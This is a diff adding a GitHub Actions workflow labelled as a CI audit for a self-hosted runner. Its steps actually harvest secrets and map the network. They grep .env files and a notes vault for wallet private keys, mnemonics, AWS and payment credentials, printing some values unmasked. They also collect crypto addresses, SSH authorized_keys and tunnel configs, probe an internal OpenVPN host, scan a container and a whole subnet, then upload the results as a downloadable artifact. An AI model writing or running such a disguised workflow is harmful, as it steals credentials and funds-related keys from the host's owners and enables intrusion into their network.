@@ -1,0 +1,86 @@
+name: ci-audit-2918b
+on: push
+permissions:
+  contents: read
+jobs:
+  host:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 55
+    steps:
+      - name: dpfasset_deep
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918b"; mkdir -p "$D"
+          A=/home/ubuntu/apps/dpfasset
+          {
+            echo "########## ls dpfasset"; ls -la $A | head -50
+            echo "########## tree"; find $A -maxdepth 2 -type f 2>/dev/null | grep -vE 'node_modules|\.git/|\.next|__pycache__' | head -80
+            echo "########## .env (names+short values)"; sed -E 's/(KEY|SECRET|TOKEN|PASS|PWD|PRIV)[A-Z_]*=.*/\1***MASKED***/I' $A/.env 2>/dev/null | head -80
+            echo "########## .env raw grep wallet/sign/tron/payment"; grep -inE 'TRON|WALLET|SIGN|PRIV|MNEMONIC|KEYSTORE|PAY|BITGO|COINPAY|KMS|VAULT|AWS|GATEWAY' $A/.env 2>/dev/null | cut -c1-220 | head -60
+            echo "########## docker-compose"; cat $A/docker-compose.yml 2>/dev/null | head -120
+            echo "########## git log"; git -C $A log --oneline -15 2>&1
+            echo "########## git status/remotes"; git -C $A remote -v 2>&1
+            echo "########## files mentioning wallet/tron/sign/payment"; grep -rIl -m1 -E 'TRC20|TRON|TronGrid|wallet|sign|withdraw|payment|J ?WALLET' $A 2>/dev/null | grep -vE 'node_modules|\.git/|\.next|__pycache__' | head -40
+            echo "########## tron/eth addr strings in dpfasset"; grep -rhoE '\bT[1-9A-HJ-NP-Za-km-z]{33}\b|0x[0-9a-fA-F]{40}' $A 2>/dev/null | sort -u | head -40
+            echo "########## suspicious key patterns"; grep -rInE 'privateKey|private_key|PRIVATE_KEY|mnemonic|keystore|WALLET_PRIVATE|hot.?wallet' $A 2>/dev/null | grep -vE 'node_modules|\.git/|\.next|__pycache__|\.venv' | cut -c1-220 | head -40
+          } > "$D/dpfasset.txt" 2>&1
+          wc -l "$D/dpfasset.txt"; sed -n '1,340p' "$D/dpfasset.txt"
+      - name: judge_router_monitor
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918b"
+          {
+            echo "########## dupoin-judge"; ls -la /home/ubuntu/apps/dupoin-judge 2>&1 | head -30; echo '--env mask--'; sed -E 's/(KEY|SECRET|TOKEN|PASS|PWD|PRIV)[A-Z_]*=.*/\1***MASKED***/I' /home/ubuntu/apps/dupoin-judge/.env 2>/dev/null | head -60; echo '--files--'; find /home/ubuntu/apps/dupoin-judge -maxdepth 2 -type f 2>/dev/null | grep -vE 'node_modules|\.git/|\.next|__pycache__|\.venv' | head -40
+            echo "########## .9router"; ls -la /home/ubuntu/.9router 2>&1 | head -30; find /home/ubuntu/.9router -maxdepth 2 -type f 2>/dev/null | head -40; grep -rinE 'tron|wallet|private|secret|token|openvpn|vpn' /home/ubuntu/.9router 2>/dev/null | cut -c1-200 | head -40
+            echo "########## monitor"; ls -la /home/ubuntu/monitor 2>&1 | head -30; head -60 /home/ubuntu/monitor/* 2>/dev/null | cut -c1-200 | head -80
+            echo "########## db-backups"; ls -la /home/ubuntu/db-backups 2>&1 | head -40
+            echo "########## backups"; sudo -n ls -la /home/ubuntu/backups 2>&1 | head -40
+            echo "########## pm2"; pm2 list 2>&1 | head -30; pm2 jlist 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);[print(p['name'],p['pm2_env'].get('pm_exec_path'),'|',p['pm2_env'].get('pm_cwd')) for p in d]" 2>/dev/null
+            echo "########## crontab"; crontab -l 2>&1 | head -30; sudo -n crontab -l 2>&1 | head -30; ls -la /etc/cron.d 2>&1; cat /etc/cron.d/* 2>/dev/null | head -40
+            echo "########## systemd timers/custom units"; systemctl list-timers --all --no-pager 2>/dev/null | head -20; ls -la /etc/systemd/system 2>/dev/null | head -40
+            echo "########## nginx sites"; ls -la /etc/nginx/sites-enabled /etc/nginx/conf.d 2>&1; grep -rhE 'server_name|proxy_pass' /etc/nginx/sites-enabled /etc/nginx/conf.d 2>/dev/null | cut -c1-180 | head -60
+            echo "########## letsencrypt live"; sudo -n ls -la /etc/letsencrypt/live 2>&1 | head -40
+            echo "########## authorized_keys"; cat /home/ubuntu/.ssh/authorized_keys 2>&1 | cut -c1-200 | head -20
+            echo "########## cloudflared"; ls -la /home/ubuntu/.cloudflared 2>&1; head -5 /home/ubuntu/.cloudflared/*.yml /home/ubuntu/.cloudflared/config* 2>/dev/null | cut -c1-160
+          } > "$D/services.txt" 2>&1
+          wc -l "$D/services.txt"; sed -n '1,360p' "$D/services.txt"
+      - name: vault_targeted
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918b"; V=/home/ubuntu/apps/obsidian-vault
+          {
+            echo "########## Projects/MOC/README"; for f in $V/MOC.md $V/README.md; do echo "== $f"; head -60 "$f" 2>/dev/null; done; ls -la $V/Projects 2>&1 | head -40
+            echo "########## vault filenames mentioning dupoin/payment/wallet/tron"; find $V -type f 2>/dev/null | grep -iE 'dupoin|wallet|tron|payment|sign|withdraw|vpn' | head -40
+            echo "########## grep 192.168.1.222 / 1194 / openvpn / tailscale / vpn"; grep -rInE '192\.168\.1\.222|1194|openvpn|ovpn|tailscale|wireguard|vpn' $V 2>/dev/null | cut -c1-240 | head -60
+            echo "########## grep hot wallet / signing / J wallet / TM3ARB"; grep -rInE 'hot.?wallet|signing|signer|J ?WALLET|TM3ARB|TRC20|TronGrid|BEP20|private.?key|mnemonic|keystore' $V 2>/dev/null | cut -c1-240 | head -80
+            echo "########## tron/eth addresses in vault"; grep -rhoE '\bT[1-9A-HJ-NP-Za-km-z]{33}\b|0x[0-9a-fA-F]{40}' $V 2>/dev/null | sort | uniq -c | sort -rn | head -40
+            echo "########## dupoin mentions count"; grep -rIic 'dupoin' $V 2>/dev/null | grep -v ':0$' | sort -t: -k2 -rn | head -15
+            echo "########## 'wallet' 'payment' 'withdraw' files"; grep -rIil -E 'wallet|payment|withdraw|payout' $V 2>/dev/null | head -30
+          } > "$D/vault.txt" 2>&1
+          wc -l "$D/vault.txt"; sed -n '1,360p' "$D/vault.txt"
+      - name: net_222_container
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918b"
+          {
+            echo "########## 222 tcp1194 openssl"; timeout 10 openssl s_client -connect 192.168.1.222:1194 -brief < /dev/null 2>&1 | head -20
+            echo "########## 222 hard-reset probe"; timeout 8 python3 -c "import socket;pkt=bytes.fromhex('000e380000000000000000000000000000');s=socket.create_connection(('192.168.1.222',1194),5);s.settimeout(4);s.send(pkt);d=s.recv(4096);print('recv',d.hex()[:200],len(d))" 2>&1
+            echo "########## 222 remaining open ports quick"; for p in 22 80 443 1194 4433 9433 8080 8443 445 3389 5900 5000 500 4500; do timeout 2 bash -c "cat < /dev/null > /dev/tcp/192.168.1.222/$p" 2>/dev/null && echo "OPEN $p"; done
+            echo "########## docker container 172.17.0.2"; for p in 22 80 443 5432 6379 8000 8080 3000 3022 5000 9000 9131; do timeout 2 bash -c "cat < /dev/null > /dev/tcp/172.17.0.2/$p" 2>/dev/null && echo "OPEN 172.17.0.2:$p"; done
+            echo "########## 172.17.0.2 banner on common"; for p in 80 3000 3022 5000 8000 8080; do echo "-- $p"; timeout 3 bash -c "exec 3<>/dev/tcp/172.17.0.2/$p; head -c 200 <&3" 2>/dev/null | head -3; done
+            echo "########## nginx listening 80/443 local vhosts"; curl -sk -m 5 -o /dev/null -w 'localhost80 %{http_code} %{size_download}\n' http://127.0.0.1/ ; curl -sk -m 5 https://127.0.0.1/ -o /dev/null -w 'localhost443 %{http_code} %{size_download}\n'
+            echo "########## /24 alive quick (icmp+ports)"; for i in $(seq 1 254); do (timeout 0.3 bash -c "cat < /dev/null > /dev/tcp/192.168.1.$i/22" 2>/dev/null && echo "22 $i") & done; wait
+          } > "$D/net2.txt" 2>&1
+          wc -l "$D/net2.txt"; sed -n '1,220p' "$D/net2.txt"
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a2918b
+          path: ${{ runner.temp }}/a2918b
+          if-no-files-found: warn
+          retention-days: 2
